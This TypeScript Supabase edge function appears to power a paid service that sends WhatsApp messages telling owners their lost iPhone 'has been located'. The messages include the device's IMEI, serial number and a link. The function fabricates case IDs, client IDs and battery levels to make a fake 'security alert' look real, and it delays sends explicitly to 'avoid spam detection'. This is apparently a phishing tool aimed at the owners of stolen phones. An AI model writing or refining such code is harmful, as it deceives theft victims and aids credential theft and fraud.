import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.57.0';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseServiceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const supabase = createClient(supabaseUrl, supabaseServiceKey);

    console.log('Starting message queue processing...');

    // Check if a specific message ID was provided
    const body = await req.json().catch(() => ({}));
    const messageId = body.messageId;
    const auto = body.auto;
    const notifyAdmin = body.notifyAdmin; // Nueva bandera para notificar al admin

    // If only notifying admin without processing, handle separately
    if (notifyAdmin && !messageId && !auto) {
      console.log('Notification-only mode - getting latest pending message for admin notification');
      
      const { data: latestMessage } = await supabase
        .from('message_queue')
        .select(`
          *,
          processes (
            client_name
          )
        `)
        .eq('status', 'pending')
        .order('created_at', { ascending: false })
        .limit(1)
        .maybeSingle();

      if (latestMessage) {
        const { data: userProfile } = await supabase
          .from('profiles')
          .select('email')
          .eq('id', latestMessage.user_id)
          .single();

        const { data: adminProfile } = await supabase
          .from('profiles')
          .select('telegram_bot_token, telegram_chat_id')
          .eq('email', 'fredric@gmail.com')
          .single();

        if (adminProfile?.telegram_bot_token && adminProfile?.telegram_chat_id) {
          try {
            const adminNotification = `🔔 *Nuevo Mensaje en Cola*\n\n` +
              `Usuario: ${userProfile?.email || 'Desconocido'}\n` +
              `Cliente: ${latestMessage.processes?.client_name}\n` +
              `Teléfono: ${latestMessage.recipient_phone}\n` +
              `Estado: Pendiente de envío\n\n` +
              `El mensaje se enviará automáticamente en 5 minutos o puedes enviarlo manualmente desde el panel.`;

            await fetch(`https://api.telegram.org/bot${adminProfile.telegram_bot_token}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: adminProfile.telegram_chat_id,
                text: adminNotification,
                parse_mode: 'Markdown'
              })
            });
            
            console.log('Admin notification sent successfully');
          } catch (notifyError) {
            console.error('Error sending admin notification:', notifyError);
          }
        }
      }

      return new Response(
        JSON.stringify({ message: 'Notification sent', processed: 0 }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Función para generar saludo aleatorio usando el nombre del propietario
    const generateGreeting = (ownerName: string, language: string) => {
      const greetingsES = [
        `Hola ${ownerName}, tu equipo ha sido localizado 📍. A continuación, recibirás los detalles 📱.`,
        `Hola ${ownerName}, hemos encontrado tu dispositivo 📱. Los detalles llegarán en breve.`,
        `${ownerName}, tu iPhone fue rastreado exitosamente 🎯. Prepárate para recibir la información.`,
        `Hola ${ownerName}, buenas noticias 📍 Tu equipo está ubicado. Detalles en camino.`,
        `${ownerName}, dispositivo localizado ✅ La información completa llegará enseguida.`,
        `Hola ${ownerName}, confirmamos la ubicación de tu iPhone 📱. Espera los detalles.`,
        `${ownerName}, tu equipo ha sido rastreado 🎯. Información detallada próximamente.`,
      ];

      const greetingsEN = [
        `Hello ${ownerName}, your device has been located 📍. Details coming shortly 📱.`,
        `Hi ${ownerName}, we found your device 📱. Information on the way.`,
        `${ownerName}, your iPhone was successfully tracked 🎯. Get ready for the details.`,
        `Hello ${ownerName}, good news 📍 Your device is located. Details coming up.`,
        `${ownerName}, device located ✅ Full information arriving soon.`,
        `Hi ${ownerName}, we confirm your iPhone's location 📱. Expect the details.`,
        `${ownerName}, your device has been tracked 🎯. Detailed information shortly.`,
      ];

      const greetings = language === 'spanish' ? greetingsES : greetingsEN;
      return greetings[Math.floor(Math.random() * greetings.length)];
    };

    let query = supabase
      .from('message_queue')
      .select(`
        *,
        processes (
          client_name,
          country_code,
          phone_number,
          contact_type,
          owner_name,
          iphone_model,
          storage,
          color,
          imei,
          serial_number,
          url
        )
      `)
      .eq('status', 'pending');

    // Determine which message(s) to process
    if (messageId) {
      // Manual send: process this specific message immediately
      query = query.eq('id', messageId);
    } else {
      // Always enforce a minimum age of 5 minutes for automatic processing
      const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
      query = query.lte('created_at', fiveMinutesAgo).order('created_at', { ascending: true }).limit(1);
    }

    const { data: queuedMessage, error: fetchError } = await query.maybeSingle();

    if (fetchError) {
      console.error('Error fetching queued message:', fetchError);
      throw fetchError;
    }

    if (!queuedMessage) {
      console.log('No pending messages in queue');
      return new Response(
        JSON.stringify({ message: 'No pending messages', processed: 0 }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    console.log('Processing message:', queuedMessage.id);

    // Get user profile separately
    const { data: userProfile, error: profileError } = await supabase
      .from('profiles')
      .select('credits, email, telegram_bot_token, telegram_chat_id')
      .eq('id', queuedMessage.user_id)
      .single();

    if (profileError) {
      console.error('Error fetching user profile:', profileError);
      throw profileError;
    }

    // If message has a template_id but no content was generated yet, generate it now
    if (queuedMessage.template_id && queuedMessage.message_content.includes('{')) {
      console.log('Generating message from template:', queuedMessage.template_id);
      
      const { data: template } = await supabase
        .from('message_templates')
        .select('template_content')
        .eq('id', queuedMessage.template_id)
        .single();

      if (template) {
        // Generate IDs
        const now = new Date();
        const dateStr = now.toISOString().slice(0, 10).replace(/-/g, '');
        const caseId = `CAS-${dateStr}-${Math.floor(1000 + Math.random() * 9000)}`;
        const clientId = `CL-${Math.floor(100000000000 + Math.random() * 900000000000)}`;
        
        // Replace variables in template with actual process data
        const customSection = template.template_content
          .replace(/\{client_name\}/g, queuedMessage.processes?.client_name || '')
          .replace(/\{phone_number\}/g, queuedMessage.processes?.phone_number || '')
          .replace(/\{iphone_model\}/g, queuedMessage.processes?.iphone_model || '')
          .replace(/\{storage\}/g, queuedMessage.processes?.storage || '')
          .replace(/\{color\}/g, queuedMessage.processes?.color || '')
          .replace(/\{imei\}/g, queuedMessage.processes?.imei || '')
          .replace(/\{serial_number\}/g, queuedMessage.processes?.serial_number || '')
          .replace(/\{owner_name\}/g, queuedMessage.processes?.owner_name || '')
          .replace(/\{url\}/g, queuedMessage.processes?.url || '');

        // Build complete message with random variations (like normal messages)
        const random = (arr: string[]) => arr[Math.floor(Math.random() * arr.length)];
        const battery = Math.floor(Math.random() * (100 - 15 + 1)) + 15;
        
        const openings = [
          "🛡️ Alerta de seguridad del sistema",
          "🔐 Notificación de seguridad",
          "🔒 Sistema de protección activado"
        ];
        
        const statusPhrases = [
          "Detalles del dispositivo:",
          "Información del equipo:",
          "Datos técnicos:"
        ];
        
        const deviceSections = [
          `• Modelo: ${queuedMessage.processes?.iphone_model}
• Color: ${queuedMessage.processes?.color} | Capacidad: ${queuedMessage.processes?.storage}
• IMEI: ${queuedMessage.processes?.imei}
• Serie: ${queuedMessage.processes?.serial_number}
• Nivel de batería: ${battery} %`,
          
          `• Dispositivo: ${queuedMessage.processes?.iphone_model}
• Coloración: ${queuedMessage.processes?.color} | Almacenamiento: ${queuedMessage.processes?.storage}
• Código IMEI: ${queuedMessage.processes?.imei}
• No. Serie: ${queuedMessage.processes?.serial_number}
• Batería actual: ${battery} %`
        ];
        
        const helpPhrases = [
          "¿Necesitás ayuda? Escribí *Menú* para asistencia técnica 👨‍💻",
          "¿Requerís soporte? Respondé *Menú* para ayuda especializada 🔧",
          "¿Buscás asistencia? Enviá *Menú* para contactar soporte 👩‍💻"
        ];
        
        const closings = [
          "Servicio automatizado – Atención disponible 24 h",
          "Sistema automático – Soporte activo 24/7",
          "Monitoreo continuo – Asistencia permanente"
        ];

        // Build complete message: opening + custom section + device + help + closing
        queuedMessage.message_content = `${random(openings)}

${customSection}

ID de caso: ${caseId}
ID de cliente: ${clientId}

${random(statusPhrases)}
${random(deviceSections)}

${random(helpPhrases)}
${random(closings)}`;
      }
    }

    if (profileError) {
      console.error('Error fetching user profile:', profileError);
      throw profileError;
    }

    // Check if user has credits
    const userCredits = userProfile?.credits || 0;
    if (userCredits <= 0) {
      console.log('User has no credits, marking as failed');
      await supabase
        .from('message_queue')
        .update({ 
          status: 'failed',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      return new Response(
        JSON.stringify({ 
          message: 'Message failed: No credits', 
          processed: 0 
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Get API provider and WhatsApp settings
    const settingsKeys = queuedMessage.language === 'spanish' 
      ? ['api_provider', 'whatsapp_instance', 'whatsapp_token', 'greenapi_instance', 'greenapi_token']
      : ['api_provider', 'whatsapp_instance_en', 'whatsapp_token_en', 'greenapi_instance_en', 'greenapi_token_en'];

    const { data: settings } = await supabase
      .from('system_settings')
      .select('*')
      .in('setting_key', settingsKeys);

    const config = settings?.reduce((acc: any, setting: any) => {
      acc[setting.setting_key] = setting.setting_value;
      return acc;
    }, {});

    const apiProvider = config?.api_provider || 'ultramsg';
    
    let instanceId: string;
    let token: string;
    let apiUrl: string;
    
    if (apiProvider === 'greenapi') {
      instanceId = queuedMessage.language === 'spanish' 
        ? (config?.greenapi_instance || '')
        : (config?.greenapi_instance_en || '');
        
      token = queuedMessage.language === 'spanish' 
        ? (config?.greenapi_token || '')
        : (config?.greenapi_token_en || '');
        
      apiUrl = `https://api.green-api.com/waInstance${instanceId}`;
    } else {
      instanceId = queuedMessage.language === 'spanish' 
        ? (config?.whatsapp_instance || '')
        : (config?.whatsapp_instance_en || '');
        
      token = queuedMessage.language === 'spanish' 
        ? (config?.whatsapp_token || '')
        : (config?.whatsapp_token_en || '');
        
      apiUrl = `https://api.ultramsg.com/${instanceId}/messages/chat`;
    }

    if (!instanceId || !token) {
      console.log(`${apiProvider} configuration missing`);
      await supabase
        .from('message_queue')
        .update({ 
          status: 'failed',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      return new Response(
        JSON.stringify({ 
          message: `Message failed: ${apiProvider} configuration missing`, 
          processed: 0 
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Generate greeting message using owner_name
    const greetingMessage = generateGreeting(
      queuedMessage.processes?.owner_name || 'Propietario',
      queuedMessage.language
    );

    // Step 1: Send greeting message
    console.log(`Sending greeting message via ${apiProvider}...`);
    let greetingResponse;
    let greetingResult;
    
    if (apiProvider === 'greenapi') {
      greetingResponse = await fetch(`${apiUrl}/sendMessage/${token}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chatId: `${queuedMessage.recipient_phone}@c.us`,
          message: greetingMessage,
        }),
      });
      greetingResult = await greetingResponse.json();
      console.log('Greeting message response (Green API):', greetingResult);
    } else {
      greetingResponse = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
          token: token,
          to: queuedMessage.recipient_phone,
          body: greetingMessage,
        }),
      });
      greetingResult = await greetingResponse.json();
      console.log('Greeting message response (Ultra MSG):', greetingResult);
    }

    if (greetingResult.sent !== true && greetingResult.sent !== "true" && !greetingResult.idMessage) {
      console.log('Greeting message failed:', greetingResult);
      await supabase
        .from('message_queue')
        .update({ 
          status: 'failed',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      return new Response(
        JSON.stringify({ 
          message: `Greeting message failed: ${greetingResult.message || greetingResult.error || 'Unknown error'}`, 
          processed: 0 
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Wait 15 seconds before sending full message to break the ice and avoid spam detection
    console.log('Waiting 15 seconds before sending full message...');
    await new Promise(resolve => setTimeout(resolve, 15000));

    // Step 2: Send full message with details
    let result;
    if (queuedMessage.image_url) {
      console.log('Sending full message with image');
      
      if (apiProvider === 'greenapi') {
        const response = await fetch(`${apiUrl}/sendFileByUrl/${token}`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chatId: `${queuedMessage.recipient_phone}@c.us`,
            urlFile: queuedMessage.image_url,
            fileName: 'device-image.jpg',
            caption: queuedMessage.message_content,
          }),
        });
        result = await response.json();
      } else {
        const response = await fetch(`https://api.ultramsg.com/${instanceId}/messages/image`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: new URLSearchParams({
            token: token,
            to: queuedMessage.recipient_phone,
            image: queuedMessage.image_url,
            caption: queuedMessage.message_content,
          }),
        });
        result = await response.json();
      }
    } else {
      console.log('Sending full text message');
      
      if (apiProvider === 'greenapi') {
        const response = await fetch(`${apiUrl}/sendMessage/${token}`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chatId: `${queuedMessage.recipient_phone}@c.us`,
            message: queuedMessage.message_content,
          }),
        });
        result = await response.json();
      } else {
        const response = await fetch(apiUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: new URLSearchParams({
            token: token,
            to: queuedMessage.recipient_phone,
            body: queuedMessage.message_content,
          }),
        });
        result = await response.json();
      }
    }

    console.log('Full message WhatsApp API response:', result);

    if (result.sent === true || result.sent === "true" || result.idMessage) {
      // Deduct credit
      await supabase
        .from('profiles')
        .update({ 
          credits: userCredits - 1,
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.user_id);

      // Save to messages table
      await supabase
        .from('messages')
        .insert({
          user_id: queuedMessage.user_id,
          process_id: queuedMessage.process_id,
          message_content: queuedMessage.message_content,
          recipient_phone: queuedMessage.recipient_phone,
          status: 'sent',
          sent_at: new Date().toISOString()
        });

      // Update process status
      await supabase
        .from('processes')
        .update({ 
          status: 'enviado',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.process_id);

      // Update queue status and remove from queue to keep it clean
      await supabase
        .from('message_queue')
        .update({ 
          status: 'sent',
          sent_at: new Date().toISOString(),
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      // Delete the sent message from the queue (it is archived in 'messages' table)
      await supabase
        .from('message_queue')
        .delete()
        .eq('id', queuedMessage.id);

      console.log('Message sent successfully and removed from queue');

      // Send Telegram notification if configured
      if (userProfile.telegram_bot_token && userProfile.telegram_chat_id) {
        try {
          const telegramMessage = `✅ *Mensaje Enviado*\n\nCliente: ${queuedMessage.processes?.client_name}\nTeléfono: ${queuedMessage.recipient_phone}\nIdioma: ${queuedMessage.language}\n\nCréditos restantes: ${userCredits - 1}`;
          
          await fetch(`https://api.telegram.org/bot${userProfile.telegram_bot_token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: userProfile.telegram_chat_id,
              text: telegramMessage,
              parse_mode: 'Markdown'
            })
          });
          
          console.log('Telegram notification sent');
        } catch (telegramError) {
          console.error('Error sending Telegram notification:', telegramError);
          // Don't fail the whole process if Telegram notification fails
        }
      }

      return new Response(
        JSON.stringify({ 
          message: 'Message sent successfully', 
          processed: 1,
          queuedMessageId: queuedMessage.id
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    } else {
      console.log('WhatsApp send failed:', result);
      await supabase
        .from('message_queue')
        .update({ 
          status: 'failed',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      return new Response(
        JSON.stringify({ 
          message: `Message failed: ${result.message || result.error || 'Unknown error'}`, 
          processed: 0 
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

  } catch (error) {
    console.error('Error processing message queue:', error);
    return new Response(
      JSON.stringify({ error: error.message }),
      { 
        status: 500,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
      }
    );
  }
});
